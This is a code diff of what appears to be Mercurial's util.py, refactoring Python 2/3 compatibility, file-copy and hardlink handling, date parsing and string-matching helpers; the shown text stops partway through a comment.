@@ -17,17 +17,21 @@ from __future__ import absolute_import
 
 import bz2
 import calendar
+import codecs
 import collections
+import contextlib
 import datetime
 import errno
 import gc
 import hashlib
 import imp
 import os
+import platform as pyplatform
 import re as remod
 import shutil
 import signal
 import socket
+import stat
 import string
 import subprocess
 import sys
@@ -35,39 +39,57 @@ import tempfile
 import textwrap
 import time
 import traceback
+import warnings
 import zlib
 
 from . import (
     encoding,
     error,
     i18n,
-    osutil,
-    parsers,
+    policy,
     pycompat,
 )
 
-for attr in (
-    'empty',
-    'httplib',
-    'httpserver',
-    'pickle',
-    'queue',
-    'urlerr',
-    'urlparse',
-    # we do import urlreq, but we do it outside the loop
-    #'urlreq',
-    'stringio',
-    'socketserver',
-    'xmlrpclib',
-):
-    a = pycompat.sysstr(attr)
-    globals()[a] = getattr(pycompat, a)
+base85 = policy.importmod(r'base85')
+osutil = policy.importmod(r'osutil')
+parsers = policy.importmod(r'parsers')
 
-# This line is to make pyflakes happy:
+b85decode = base85.b85decode
+b85encode = base85.b85encode
+
+cookielib = pycompat.cookielib
+empty = pycompat.empty
+httplib = pycompat.httplib
+httpserver = pycompat.httpserver
+pickle = pycompat.pickle
+queue = pycompat.queue
+socketserver = pycompat.socketserver
+stderr = pycompat.stderr
+stdin = pycompat.stdin
+stdout = pycompat.stdout
+stringio = pycompat.stringio
+urlerr = pycompat.urlerr
 urlreq = pycompat.urlreq
+xmlrpclib = pycompat.xmlrpclib
 
-if os.name == 'nt':
+# workaround for win32mbcs
+_filenamebytestr = pycompat.bytestr
+
+def isatty(fp):
+    try:
+        return fp.isatty()
+    except AttributeError:
+        return False
+
+# glibc determines buffering on first write to stdout - if we replace a TTY
+# destined stdout with a pipe destined stdout (e.g. pager), we want line
+# buffering
+if isatty(stdout):
+    stdout = os.fdopen(stdout.fileno(), pycompat.sysstr('wb'), 1)
+
+if pycompat.osname == 'nt':
     from . import windows as platform
+    stdout = platform.winstdout(stdout)
 else:
     from . import posix as platform
 
@@ -90,6 +112,7 @@ groupname = platform.groupname
 hidewindow = platform.hidewindow
 isexec = platform.isexec
 isowner = platform.isowner
+listdir = osutil.listdir
 localpath = platform.localpath
 lookupreg = platform.lookupreg
 makedir = platform.makedir
@@ -122,12 +145,19 @@ sshargs = platform.sshargs
 statfiles = getattr(osutil, 'statfiles', platform.statfiles)
 statisexec = platform.statisexec
 statislink = platform.statislink
-termwidth = platform.termwidth
 testpid = platform.testpid
 umask = platform.umask
 unlink = platform.unlink
-unlinkpath = platform.unlinkpath
 username = platform.username
+
+try:
+    recvfds = osutil.recvfds
+except AttributeError:
+    pass
+try:
+    setprocname = osutil.setprocname
+except AttributeError:
+    pass
 
 # Python compatibility
 
@@ -140,6 +170,37 @@ os.stat_float_times(False)
 
 def safehasattr(thing, attr):
     return getattr(thing, attr, _notset) is not _notset
+
+def bitsfrom(container):
+    bits = 0
+    for bit in container:
+        bits |= bit
+    return bits
+
+# python 2.6 still have deprecation warning enabled by default. We do not want
+# to display anything to standard user so detect if we are running test and
+# only use python deprecation warning in this case.
+_dowarn = bool(encoding.environ.get('HGEMITWARNINGS'))
+if _dowarn:
+    # explicitly unfilter our warning for python 2.7
+    #
+    # The option of setting PYTHONWARNINGS in the test runner was investigated.
+    # However, module name set through PYTHONWARNINGS was exactly matched, so
+    # we cannot set 'mercurial' and have it match eg: 'mercurial.scmutil'. This
+    # makes the whole PYTHONWARNINGS thing useless for our usecase.
+    warnings.filterwarnings(r'default', r'', DeprecationWarning, r'mercurial')
+    warnings.filterwarnings(r'default', r'', DeprecationWarning, r'hgext')
+    warnings.filterwarnings(r'default', r'', DeprecationWarning, r'hgext3rd')
+
+def nouideprecwarn(msg, version, stacklevel=1):
+    """Issue an python native deprecation warning
+
+    This is a noop outside of tests, use 'ui.deprecwarn' when possible.
+    """
+    if _dowarn:
+        msg += ("\n(compatibility will be dropped after Mercurial-%s,"
+                " update your code.)") % version
+        warnings.warn(msg, DeprecationWarning, stacklevel + 1)
 
 DIGESTS = {
     'md5': hashlib.md5,
@@ -234,14 +295,12 @@ class digestchecker(object):
 try:
     buffer = buffer
 except NameError:
-    if not pycompat.ispy3:
-        def buffer(sliceable, offset=0):
-            return sliceable[offset:]
-    else:
-        def buffer(sliceable, offset=0):
-            return memoryview(sliceable)[offset:]
+    def buffer(sliceable, offset=0, length=None):
+        if length is not None:
+            return memoryview(sliceable)[offset:offset + length]
+        return memoryview(sliceable)[offset:]
 
-closefds = os.name == 'posix'
+closefds = pycompat.osname == 'posix'
 
 _chunksize = 4096
 
@@ -508,54 +567,48 @@ def cachefunc(func):
 
     return f
 
-class sortdict(dict):
-    '''a simple sorted dictionary'''
-    def __init__(self, data=None):
-        self._list = []
-        if data:
-            self.update(data)
-    def copy(self):
-        return sortdict(self)
-    def __setitem__(self, key, val):
+class sortdict(collections.OrderedDict):
+    '''a simple sorted dictionary
+
+    >>> d1 = sortdict([('a', 0), ('b', 1)])
+    >>> d2 = d1.copy()
+    >>> d2
+    sortdict([('a', 0), ('b', 1)])
+    >>> d2.update([('a', 2)])
+    >>> d2.keys() # should still be in last-set order
+    ['b', 'a']
+    '''
+
+    def __setitem__(self, key, value):
         if key in self:
-            self._list.remove(key)
-        self._list.append(key)
-        dict.__setitem__(self, key, val)
-    def __iter__(self):
-        return self._list.__iter__()
-    def update(self, src):
-        if isinstance(src, dict):
-            src = src.iteritems()
-        for k, v in src:
-            self[k] = v
-    def clear(self):
-        dict.clear(self)
-        self._list = []
-    def items(self):
-        return [(k, self[k]) for k in self._list]
-    def __delitem__(self, key):
-        dict.__delitem__(self, key)
-        self._list.remove(key)
-    def pop(self, key, *args, **kwargs):
-        dict.pop(self, key, *args, **kwargs)
-        try:
-            self._list.remove(key)
-        except ValueError:
-            pass
-    def keys(self):
-        return self._list
-    def iterkeys(self):
-        return self._list.__iter__()
-    def iteritems(self):
-        for k in self._list:
-            yield k, self[k]
-    def insert(self, index, key, val):
-        self._list.insert(index, key)
-        dict.__setitem__(self, key, val)
-    def __repr__(self):
-        if not self:
-            return '%s()' % self.__class__.__name__
-        return '%s(%r)' % (self.__class__.__name__, self.items())
+            del self[key]
+        super(sortdict, self).__setitem__(key, value)
+
+    if pycompat.ispypy:
+        # __setitem__() isn't called as of PyPy 5.8.0
+        def update(self, src):
+            if isinstance(src, dict):
+                src = src.iteritems()
+            for k, v in src:
+                self[k] = v
+
+@contextlib.contextmanager
+def acceptintervention(tr=None):
+    """A context manager that closes the transaction on InterventionRequired
+
+    If no transaction was provided, this simply runs the body and returns
+    """
+    if not tr:
+        yield
+        return
+    try:
+        yield
+        tr.close()
+    except error.InterventionRequired:
+        tr.close()
+        raise
+    finally:
+        tr.release()
 
 class _lrucachenode(object):
     """A node in a doubly linked list.
@@ -790,7 +843,7 @@ def tempfilter(s, cmd):
     inname, outname = None, None
     try:
         infd, inname = tempfile.mkstemp(prefix='hg-filter-in-')
-        fp = os.fdopen(infd, 'wb')
+        fp = os.fdopen(infd, pycompat.sysstr('wb'))
         fp.write(s)
         fp.close()
         outfd, outname = tempfile.mkstemp(prefix='hg-filter-out-')
@@ -798,7 +851,7 @@ def tempfilter(s, cmd):
         cmd = cmd.replace('INFILE', inname)
         cmd = cmd.replace('OUTFILE', outname)
         code = os.system(cmd)
-        if sys.platform == 'OpenVMS' and code & 1:
+        if pycompat.sysplatform == 'OpenVMS' and code & 1:
             code = 0
         if code:
             raise Abort(_("command '%s' failed: %s") %
@@ -919,7 +972,7 @@ def pathto(root, n1, n2):
         a.pop()
         b.pop()
     b.reverse()
-    return os.sep.join((['..'] * len(a)) + b) or '.'
+    return pycompat.ossep.join((['..'] * len(a)) + b) or '.'
 
 def mainfrozen():
     """return True if we are a frozen executable.
@@ -934,9 +987,9 @@ def mainfrozen():
 # the location of data files matching the source code
 if mainfrozen() and getattr(sys, 'frozen', None) != 'macosx_app':
     # executable version (py2exe) doesn't support __file__
-    datapath = os.path.dirname(sys.executable)
+    datapath = os.path.dirname(pycompat.sysexecutable)
 else:
-    datapath = os.path.dirname(__file__)
+    datapath = os.path.dirname(pycompat.fsencode(__file__))
 
 i18n.setdatapath(datapath)
 
@@ -948,18 +1001,19 @@ def hgexecutable():
     Defaults to $HG or 'hg' in the search path.
     """
     if _hgexecutable is None:
-        hg = os.environ.get('HG')
-        mainmod = sys.modules['__main__']
+        hg = encoding.environ.get('HG')
+        mainmod = sys.modules[pycompat.sysstr('__main__')]
         if hg:
             _sethgexecutable(hg)
         elif mainfrozen():
             if getattr(sys, 'frozen', None) == 'macosx_app':
                 # Env variable set by py2app
-                _sethgexecutable(os.environ['EXECUTABLEPATH'])
+                _sethgexecutable(encoding.environ['EXECUTABLEPATH'])
             else:
-                _sethgexecutable(sys.executable)
-        elif os.path.basename(getattr(mainmod, '__file__', '')) == 'hg':
-            _sethgexecutable(mainmod.__file__)
+                _sethgexecutable(pycompat.sysexecutable)
+        elif (os.path.basename(
+            pycompat.fsencode(getattr(mainmod, '__file__', ''))) == 'hg'):
+            _sethgexecutable(pycompat.fsencode(mainmod.__file__))
         else:
             exe = findexe('hg') or os.path.basename(sys.argv[0])
             _sethgexecutable(exe)
@@ -974,21 +1028,8 @@ def _isstdout(f):
     fileno = getattr(f, 'fileno', None)
     return fileno and fileno() == sys.__stdout__.fileno()
 
-def system(cmd, environ=None, cwd=None, onerr=None, errprefix=None, out=None):
-    '''enhanced shell command execution.
-    run with environment maybe modified, maybe in different dir.
-
-    if command fails and onerr is None, return status, else raise onerr
-    object as exception.
-
-    if out is specified, it is assumed to be a file-like object that has a
-    write() method. stdout and stderr will be redirected to out.'''
-    if environ is None:
-        environ = {}
-    try:
-        sys.stdout.flush()
-    except Exception:
-        pass
+def shellenviron(environ=None):
+    """return environ with optional override, useful for shelling out"""
     def py2shell(val):
         'convert python object into string that is useful to shell'
         if val is None or val is False:
@@ -996,38 +1037,37 @@ def system(cmd, environ=None, cwd=None, onerr=None, errprefix=None, out=None):
         if val is True:
             return '1'
         return str(val)
-    origcmd = cmd
-    cmd = quotecommand(cmd)
-    if sys.platform == 'plan9' and (sys.version_info[0] == 2
-                                    and sys.version_info[1] < 7):
-        # subprocess kludge to work around issues in half-baked Python
-        # ports, notably bichued/python:
-        if not cwd is None:
-            os.chdir(cwd)
-        rc = os.system(cmd)
-    else:
-        env = dict(os.environ)
+    env = dict(encoding.environ)
+    if environ:
         env.update((k, py2shell(v)) for k, v in environ.iteritems())
-        env['HG'] = hgexecutable()
-        if out is None or _isstdout(out):
-            rc = subprocess.call(cmd, shell=True, close_fds=closefds,
-                                 env=env, cwd=cwd)
-        else:
-            proc = subprocess.Popen(cmd, shell=True, close_fds=closefds,
-                                    env=env, cwd=cwd, stdout=subprocess.PIPE,
-                                    stderr=subprocess.STDOUT)
-            for line in iter(proc.stdout.readline, ''):
-                out.write(line)
-            proc.wait()
-            rc = proc.returncode
-        if sys.platform == 'OpenVMS' and rc & 1:
-            rc = 0
-    if rc and onerr:
-        errmsg = '%s %s' % (os.path.basename(origcmd.split(None, 1)[0]),
-                            explainexit(rc)[0])
-        if errprefix:
-            errmsg = '%s: %s' % (errprefix, errmsg)
-        raise onerr(errmsg)
+    env['HG'] = hgexecutable()
+    return env
+
+def system(cmd, environ=None, cwd=None, out=None):
+    '''enhanced shell command execution.
+    run with environment maybe modified, maybe in different dir.
+
+    if out is specified, it is assumed to be a file-like object that has a
+    write() method. stdout and stderr will be redirected to out.'''
+    try:
+        stdout.flush()
+    except Exception:
+        pass
+    cmd = quotecommand(cmd)
+    env = shellenviron(environ)
+    if out is None or _isstdout(out):
+        rc = subprocess.call(cmd, shell=True, close_fds=closefds,
+                             env=env, cwd=cwd)
+    else:
+        proc = subprocess.Popen(cmd, shell=True, close_fds=closefds,
+                                env=env, cwd=cwd, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT)
+        for line in iter(proc.stdout.readline, ''):
+            out.write(line)
+        proc.wait()
+        rc = proc.returncode
+    if pycompat.sysplatform == 'OpenVMS' and rc & 1:
+        rc = 0
     return rc
 
 def checksignature(func):
@@ -1041,6 +1081,21 @@ def checksignature(func):
             raise
 
     return check
+
+# a whilelist of known filesystems where hardlink works reliably
+_hardlinkfswhitelist = {
+    'btrfs',
+    'ext2',
+    'ext3',
+    'ext4',
+    'hfs',
+    'jfs',
+    'reiserfs',
+    'tmpfs',
+    'ufs',
+    'xfs',
+    'zfs',
+}
 
 def copyfile(src, dest, hardlink=False, copystat=False, checkambig=False):
     '''copy a file, preserving mode and optionally other stat info like
@@ -1056,11 +1111,18 @@ def copyfile(src, dest, hardlink=False, copystat=False, checkambig=False):
     oldstat = None
     if os.path.lexists(dest):
         if checkambig:
-            oldstat = checkambig and filestat(dest)
+            oldstat = checkambig and filestat.frompath(dest)
         unlink(dest)
-    # hardlinks are problematic on CIFS, quietly ignore this flag
-    # until we find a way to work around it cleanly (issue4546)
-    if False and hardlink:
+    if hardlink:
+        # Hardlinks are problematic on CIFS (issue4546), do not allow hardlinks
+        # unless we are confident that dest is on a whitelisted filesystem.
+        try:
+            fstype = getfstype(os.path.dirname(dest))
+        except OSError:
+            fstype = None
+        if fstype not in _hardlinkfswhitelist:
+            hardlink = False
+    if hardlink:
         try:
             oslink(src, dest)
             return
@@ -1079,7 +1141,7 @@ def copyfile(src, dest, hardlink=False, copystat=False, checkambig=False):
             else:
                 shutil.copymode(src, dest)
                 if oldstat and oldstat.stat:
-                    newstat = filestat(dest)
+                    newstat = filestat.frompath(dest)
                     if newstat.isambig(oldstat):
                         # stat of copied file is ambiguous to original one
                         advanced = (oldstat.stat.st_mtime + 1) & 0x7fffffff
@@ -1091,17 +1153,15 @@ def copyfiles(src, dst, hardlink=None, progress=lambda t, pos: None):
     """Copy a directory tree using hardlinks if possible."""
     num = 0
 
-    if hardlink is None:
-        hardlink = (os.stat(src).st_dev ==
-                    os.stat(os.path.dirname(dst)).st_dev)
-    if hardlink:
-        topic = _('linking')
-    else:
-        topic = _('copying')
+    gettopic = lambda: hardlink and _('linking') or _('copying')
 
     if os.path.isdir(src):
+        if hardlink is None:
+            hardlink = (os.stat(src).st_dev ==
+                        os.stat(os.path.dirname(dst)).st_dev)
+        topic = gettopic()
         os.mkdir(dst)
-        for name, kind in osutil.listdir(src):
+        for name, kind in listdir(src):
             srcname = os.path.join(src, name)
             dstname = os.path.join(dst, name)
             def nprog(t, pos):
@@ -1110,6 +1170,11 @@ def copyfiles(src, dst, hardlink=None, progress=lambda t, pos: None):
             hardlink, n = copyfiles(srcname, dstname, hardlink, progress=nprog)
             num += n
     else:
+        if hardlink is None:
+            hardlink = (os.stat(os.path.dirname(src)).st_dev ==
+                        os.stat(os.path.dirname(dst)).st_dev)
+        topic = gettopic()
+
         if hardlink:
             try:
                 oslink(src, dst)
@@ -1124,7 +1189,7 @@ def copyfiles(src, dst, hardlink=None, progress=lambda t, pos: None):
 
     return hardlink, num
 
-_winreservednames = '''con prn aux nul
+_winreservednames = b'''con prn aux nul
     com1 com2 com3 com4 com5 com6 com7 com8 com9
     lpt1 lpt2 lpt3 lpt4 lpt5 lpt6 lpt7 lpt8 lpt9'''.split()
 _winreservedchars = ':*?"<>|'
@@ -1159,7 +1224,7 @@ def checkwinfilename(path):
     for n in path.replace('\\', '/').split('/'):
         if not n:
             continue
-        for c in n:
+        for c in _filenamebytestr(n):
             if c in _winreservedchars:
                 return _("filename contains '%s', which is reserved "
                          "on Windows") % c
@@ -1175,10 +1240,15 @@ def checkwinfilename(path):
             return _("filename ends with '%s', which is not allowed "
                      "on Windows") % t
 
-if os.name == 'nt':
+if pycompat.osname == 'nt':
     checkosfilename = checkwinfilename
+    timer = time.clock
 else:
     checkosfilename = platform.checkosfilename
+    timer = time.time
+
+if safehasattr(time, "perf_counter"):
+    timer = time.perf_counter
 
 def makelock(info, pathname):
     try:
@@ -1303,12 +1373,12 @@ def fspath(name, root):
     def _makefspathcacheentry(dir):
         return dict((normcase(n), n) for n in os.listdir(dir))
 
-    seps = os.sep
-    if os.altsep:
-        seps = seps + os.altsep
+    seps = pycompat.ossep
+    if pycompat.osaltsep:
+        seps = seps + pycompat.osaltsep
     # Protect backslashes. This gets silly very quickly.
     seps.replace('\\','\\\\')
-    pattern = remod.compile(r'([^%s]+)|([%s]+)' % (seps, seps))
+    pattern = remod.compile(br'([^%s]+)|([%s]+)' % (seps, seps))
     dir = os.path.normpath(root)
     result = []
     for part, sep in pattern.findall(name):
@@ -1331,6 +1401,13 @@ def fspath(name, root):
         dir = os.path.join(dir, part)
 
     return ''.join(result)
+
+def getfstype(dirpath):
+    '''Get the filesystem type name from a directory (best-effort)
+
+    Returns None if we are unsure. Raises OSError on ENOENT, EPERM, etc.
+    '''
+    return getattr(osutil, 'getfstype', lambda x: None)(dirpath)
 
 def checknlink(testfile):
     '''check whether hardlink count reporting works properly'''
@@ -1370,7 +1447,8 @@ def checknlink(testfile):
 
 def endswithsep(path):
     '''Check path ends with os.sep or os.altsep.'''
-    return path.endswith(os.sep) or os.altsep and path.endswith(os.altsep)
+    return (path.endswith(pycompat.ossep)
+            or pycompat.osaltsep and path.endswith(pycompat.osaltsep))
 
 def splitpath(path):
     '''Split path by os.sep.
@@ -1378,12 +1456,12 @@ def splitpath(path):
     an alternative of simple "xxx.split(os.sep)".
     It is recommended to use os.path.normpath() before using this
     function if need.'''
-    return path.split(os.sep)
+    return path.split(pycompat.ossep)
 
 def gui():
     '''Are we running in a GUI?'''
-    if sys.platform == 'darwin':
-        if 'SSH_CONNECTION' in os.environ:
+    if pycompat.sysplatform == 'darwin':
+        if 'SSH_CONNECTION' in encoding.environ:
             # handle SSH access to a box where the user is logged in
             return False
         elif getattr(osutil, 'isgui', None):
@@ -1393,7 +1471,7 @@ def gui():
             # pure build; use a safe default
             return True
     else:
-        return os.name == "nt" or os.environ.get("DISPLAY")
+        return pycompat.osname == "nt" or encoding.environ.get("DISPLAY")
 
 def mktempcopy(name, emptyok=False, createmode=None):
     """Create a temporary file with the same contents from name
@@ -1441,24 +1519,38 @@ class filestat(object):
     exists. Otherwise, it is None. This can avoid preparative
     'exists()' examination on client side of this class.
     """
-    def __init__(self, path):
+    def __init__(self, stat):
+        self.stat = stat
+
+    @classmethod
+    def frompath(cls, path):
         try:
-            self.stat = os.stat(path)
+            stat = os.stat(path)
         except OSError as err:
             if err.errno != errno.ENOENT:
                 raise
-            self.stat = None
+            stat = None
+        return cls(stat)
+
+    @classmethod
+    def fromfp(cls, fp):
+        stat = os.fstat(fp.fileno())
+        return cls(stat)
 
     __hash__ = object.__hash__
 
     def __eq__(self, old):
         try:
             # if ambiguity between stat of new and old file is
-            # avoided, comparision of size, ctime and mtime is enough
+            # avoided, comparison of size, ctime and mtime is enough
             # to exactly detect change of a file regardless of platform
             return (self.stat.st_size == old.stat.st_size and
                     self.stat.st_ctime == old.stat.st_ctime and
                     self.stat.st_mtime == old.stat.st_mtime)
+        except AttributeError:
+            pass
+        try:
+            return self.stat is None and old.stat is None
         except AttributeError:
             return False
 
@@ -1497,6 +1589,28 @@ class filestat(object):
         except AttributeError:
             return False
 
+    def avoidambig(self, path, old):
+        """Change file stat of specified path to avoid ambiguity
+
+        'old' should be previous filestat of 'path'.
+
+        This skips avoiding ambiguity, if a process doesn't have
+        appropriate privileges for 'path'. This returns False in this
+        case.
+
+        Otherwise, this returns True, as "ambiguity is avoided".
+        """
+        advanced = (old.stat.st_mtime + 1) & 0x7fffffff
+        try:
+            os.utime(path, (advanced, advanced))
+        except OSError as inst:
+            if inst.errno == errno.EPERM:
+                # utime() on the file created by another user causes EPERM,
+                # if a process doesn't have appropriate privileges
+                return False
+            raise
+        return True
+
     def __ne__(self, other):
         return not self == other
 
@@ -1531,10 +1645,10 @@ class atomictempfile(object):
         if not self._fp.closed:
             self._fp.close()
             filename = localpath(self.__name)
-            oldstat = self._checkambig and filestat(filename)
+            oldstat = self._checkambig and filestat.frompath(filename)
             if oldstat and oldstat.stat:
                 rename(self._tempname, filename)
-                newstat = filestat(filename)
+                newstat = filestat.frompath(filename)
                 if newstat.isambig(oldstat):
                     # stat of changed file is ambiguous to original one
                     advanced = (oldstat.stat.st_mtime + 1) & 0x7fffffff
@@ -1562,6 +1676,26 @@ class atomictempfile(object):
             self.discard()
         else:
             self.close()
+
+def unlinkpath(f, ignoremissing=False):
+    """unlink and remove the directory if it is empty"""
+    if ignoremissing:
+        tryunlink(f)
+    else:
+        unlink(f)
+    # try removing directories that might now be empty
+    try:
+        removedirs(os.path.dirname(f))
+    except OSError:
+        pass
+
+def tryunlink(f):
+    """Attempt to remove a file, ignoring ENOENT errors."""
+    try:
+        unlink(f)
+    except OSError as e:
+        if e.errno != errno.ENOENT:
+            raise
 
 def makedirs(name, mode=None, notindexed=False):
     """recursive directory creation with parent mode inheritance
@@ -1608,8 +1742,7 @@ class chunkbuffer(object):
     iterator over chunks of arbitrary size."""
 
     def __init__(self, in_iter):
-        """in_iter is the iterator that's iterating over the input chunks.
-        targetsize is how big a buffer to try to maintain."""
+        """in_iter is the iterator that's iterating over the input chunks."""
         def splitbig(chunks):
             for chunk in chunks:
                 if len(chunk) > 2**20:
@@ -1751,7 +1884,7 @@ def datestr(date=None, format='%a %b %d %H:%M:%S %Y %1%2'):
     # because they use the gmtime() system call which is buggy on Windows
     # for negative values.
     t = datetime.datetime(1970, 1, 1) + datetime.timedelta(seconds=d)
-    s = t.strftime(format)
+    s = encoding.strtolocal(t.strftime(encoding.strfromlocal(format)))
     return s
 
 def shortdate(date=None):
@@ -1786,15 +1919,19 @@ def parsetimezone(s):
 
     return None, s
 
-def strdate(string, format, defaults=[]):
+def strdate(string, format, defaults=None):
     """parse a localized time string and return a (unixtime, offset) tuple.
     if the string cannot be parsed, ValueError is raised."""
+    if defaults is None:
+        defaults = {}
+
     # NOTE: unixtime = localunixtime + offset
     offset, date = parsetimezone(string)
 
     # add missing elements from defaults
     usenow = False # default to using biased defaults
     for part in ("S", "M", "HI", "d", "mb", "yY"): # decreasing specificity
+        part = pycompat.bytestr(part)
         found = [True for p in part if ("%"+p) in format]
         if not found:
             date += "@" + defaults[part][usenow]
@@ -1804,7 +1941,8 @@ def strdate(string, format, defaults=[]):
             # elements are relative to today
             usenow = True
 
-    timetuple = time.strptime(date, format)
+    timetuple = time.strptime(encoding.strfromlocal(date),
+                              encoding.strfromlocal(format))
     localunixtime = int(calendar.timegm(timetuple))
     if offset is None:
         # local timezone
@@ -1862,13 +2000,13 @@ def parsedate(date, formats=None, bias=None):
             # this piece is for rounding the specific end of unknowns
             b = bias.get(part)
             if b is None:
-                if part[0] in "HMS":
+                if part[0:1] in "HMS":
                     b = "00"
                 else:
                     b = "0"
 
             # this piece is for matching the generic end to today's date
-            n = datestr(now, "%" + part[0])
+            n = datestr(now, "%" + part[0:1])
 
             defaults[part] = (b, n)
 
@@ -1880,15 +2018,15 @@ def parsedate(date, formats=None, bias=None):
             else:
                 break
         else:
-            raise Abort(_('invalid date: %r') % date)
+            raise error.ParseError(_('invalid date: %r') % date)
     # validate explicit (probably user-specified) date and
     # time zone offset. values must fit in signed 32 bits for
     # current 32-bit linux runtimes. timezones go from UTC-12
     # to UTC+14
     if when < -0x80000000 or when > 0x7fffffff:
-        raise Abort(_('date exceeds 32 bits: %d') % when)
+        raise error.ParseError(_('date exceeds 32 bits: %d') % when)
     if offset < -50400 or offset > 43200:
-        raise Abort(_('impossible time zone offset: %d') % offset)
+        raise error.ParseError(_('impossible time zone offset: %d') % offset)
     return when, offset
 
 def matchdate(date):
@@ -1967,7 +2105,7 @@ def matchdate(date):
         start, stop = lower(date), upper(date)
         return lambda x: x >= start and x <= stop
 
-def stringmatcher(pattern):
+def stringmatcher(pattern, casesensitive=True):
     """
     accepts a string, possibly starting with 're:' or 'literal:' prefix.
     returns the matcher name, pattern, and matcher function.
@@ -1976,6 +2114,9 @@ def stringmatcher(pattern):
     helper for tests:
     >>> def test(pattern, *tests):
     ...     kind, pattern, matcher = stringmatcher(pattern)
+    ...     return (kind, pattern, [bool(matcher(t)) for t in tests])
+    >>> def itest(pattern, *tests):
+    ...     kind, pattern, matcher = stringmatcher(pattern, casesensitive=False)
     ...     return (kind, pattern, [bool(matcher(t)) for t in tests])
 
     exact matching (no prefix):
@@ -1993,18 +2134,35 @@ def stringmatcher(pattern):
     unknown prefixes are ignored and treated as literals
     >>> test('foo:bar', 'foo', 'bar', 'foo:bar')
     ('literal', 'foo:bar', [False, False, True])
+
+    case insensitive regex matches
+    >>> itest('re:A.+b', 'nomatch', 'fooadef', 'fooadefBar')
+    ('re', 'A.+b', [False, False, True])
+
+    case insensitive literal matches
+    >>> itest('ABCDEFG', 'abc', 'def', 'abcdefg')
+    ('literal', 'ABCDEFG', [False, False, True])
     """
     if pattern.startswith('re:'):
         pattern = pattern[3:]
         try:
-            regex = remod.compile(pattern)
+            flags = 0
+            if not casesensitive:
+                flags = remod.I
+            regex = remod.compile(pattern, flags)
         except remod.error as e:
             raise error.ParseError(_('invalid regular expression: %s')
                                    % e)
         return 're', pattern, regex.search
     elif pattern.startswith('literal:'):
         pattern = pattern[8:]
-    return 'literal', pattern, pattern.__eq__
+
+    match = pattern.__eq__
+
+    if not casesensitive:
+        ipat = encoding.lower(pattern)
+        match = lambda s: ipat == encoding.lower(s)
+    return 'literal', pattern, match
 
 def shortuser(user):
     """Return a short representation of a user name or email address."""
@@ -2048,11 +2206,32 @@ def unitcountfn(*unittable):
 
     def go(count):
         for multiplier, divisor, format in unittable:
-            if count >= divisor * multiplier:
+            if abs(count) >= divisor * multiplier:
                 return format % (count / float(divisor))
         return unittable[-1][2] % count
 
     return go
+
+def processlinerange(fromline, toline):
+    """Check that linerange <fromline>:<toline> makes sense and return a
+    0-based range.
+
+    >>> processlinerange(10, 20)
+    (9, 20)
+    >>> processlinerange(2, 1)
+    Traceback (most recent call last):
+        ...
+    ParseError: line range must be positive
+    >>> processlinerange(0, 5)
+    Traceback (most recent call last):
+        ...
+    ParseError: fromline must be strictly positive
+    """
+    if toline - fromline < 0:
+        raise error.ParseError(_("line range must be positive"))
+    if fromline < 1:
+        raise error.ParseError(_("fromline must be strictly positive"))
+    return fromline - 1, toline
 
 bytecount = unitcountfn(
     (100, 1 << 30, _('%.0f GB')),
@@ -2066,6 +2245,32 @@ bytecount = unitcountfn(
     (1, 1 << 10, _('%.2f KB')),
     (1, 1, _('%.0f bytes')),
     )
+
+# Matches a single EOL which can either be a CRLF where repeated CR
+# are removed or a LF. We do not care about old Macintosh files, so a
+# stray CR is an error.
+_eolre = remod.compile(br'\r*\n')
+
+def tolf(s):
+    return _eolre.sub('\n', s)
+
+def tocrlf(s):
+    return _eolre.sub('\r\n', s)
+
+if pycompat.oslinesep == '\r\n':
+    tonativeeol = tocrlf
+    fromnativeeol = tolf
+else:
+    tonativeeol = pycompat.identity
+    fromnativeeol = pycompat.identity
+
+def escapestr(s):
+    # call underlying function of s.encode('string_escape') directly for
+    # Python 3 compatibility
+    return codecs.escape_encode(s)[0]
+
+def unescapestr(s):
+    return codecs.escape_decode(s)[0]
 
 def uirepr(s):
     # Avoid double backslash in Windows path repr()
@@ -2139,7 +2344,7 @@ def MBTextWrapper(**kwargs):
 
                 # First chunk on line is whitespace -- drop it, unless this
                 # is the very beginning of the text (i.e. no lines started yet).
-                if self.drop_whitespace and chunks[-1].strip() == '' and lines:
+                if self.drop_whitespace and chunks[-1].strip() == r'' and lines:
                     del chunks[-1]
 
                 while chunks:
@@ -2161,13 +2366,13 @@ def MBTextWrapper(**kwargs):
 
                 # If the last chunk on this line is all whitespace, drop it.
                 if (self.drop_whitespace and
-                    cur_line and cur_line[-1].strip() == ''):
+                    cur_line and cur_line[-1].strip() == r''):
                     del cur_line[-1]
 
                 # Convert current line back to a string and store it in list
                 # of all lines (return value).
                 if cur_line:
-                    lines.append(indent + ''.join(cur_line))
+                    lines.append(indent + r''.join(cur_line))
 
             return lines
 
@@ -2180,13 +2385,88 @@ def wrap(line, width, initindent='', hangindent=''):
     if width <= maxindent:
         # adjust for weird terminal size
         width = max(78, maxindent + 1)
-    line = line.decode(encoding.encoding, encoding.encodingmode)
-    initindent = initindent.decode(encoding.encoding, encoding.encodingmode)
-    hangindent = hangindent.decode(encoding.encoding, encoding.encodingmode)
+    line = line.decode(pycompat.sysstr(encoding.encoding),
+                    pycompat.sysstr(encoding.encodingmode))
+    initindent = initindent.decode(pycompat.sysstr(encoding.encoding),
+                    pycompat.sysstr(encoding.encodingmode))
+    hangindent = hangindent.decode(pycompat.sysstr(encoding.encoding),
+                    pycompat.sysstr(encoding.encodingmode))
     wrapper = MBTextWrapper(width=width,
                             initial_indent=initindent,
                             subsequent_indent=hangindent)
-    return wrapper.fill(line).encode(encoding.encoding)
+    return wrapper.fill(line).encode(pycompat.sysstr(encoding.encoding))
+
+if (pyplatform.python_implementation() == 'CPython' and
+    sys.version_info < (3, 0)):
+    # There is an issue in CPython that some IO methods do not handle EINTR
+    # correctly. The following table shows what CPython version (and functions)
+    # are affected (buggy: has the EINTR bug, okay: otherwise):
+    #
+    #                | < 2.7.4 | 2.7.4 to 2.7.12 | >= 3.0
+    #   --------------------------------------------------
+    #    fp.__iter__ | buggy   | buggy           | okay
+    #    fp.read*    | buggy   | okay [1]        | okay
+    #
+    # [1]: fixed by changeset 67dc99a989cd in the cpython hg repo.
+    #
+    # Here we workaround the EINTR issue for fileobj.__iter__. Other methods
+    # like "read*" are ignored for now, as Python < 2.7.4 is a minority.
+    #
+    # Although we can workaround the EINTR issue for fp.__iter__, it is slower:
+    # "for x in fp" is 4x faster than "for x in iter(fp.readline, '')" in
+    # CPython 2, because CPython 2 maintains an internal readahead buffer for
+    # fp.__iter__ but not other fp.read* methods.
+    #
